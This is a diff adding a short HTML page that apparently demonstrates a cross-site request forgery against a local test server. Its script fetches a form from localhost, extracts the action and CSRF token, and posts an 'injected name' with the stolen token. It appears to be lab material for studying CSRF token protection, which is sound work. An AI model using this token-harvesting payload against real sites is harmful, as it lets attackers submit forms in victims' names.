@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Fetch and submit form with JS</title>
+    <script>
+      fetch("http://localhost:3000/form")
+      .then(r => r.text())
+      .then(d => {
+        const action = new DOMParser()
+          .parseFromString(d, 'text/html')
+          .forms[0]
+          .getAttribute('action');
+        const csrfToken = new DOMParser()
+          .parseFromString(d, 'text/html')
+          .forms[0]
+          .elements['csrfToken']
+          .value;
+
+        
+        const data = new URLSearchParams();
+        data.append("name", "injected name");
+        data.append("csrfToken", csrfToken);
+
+        fetch('http://localhost:3000' + action, {
+          method: 'POST',
+          body: data
+        })
+        .then(r => console.log("status: ", r.status));
+      })
+      .catch(e => console.log(e));
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
+
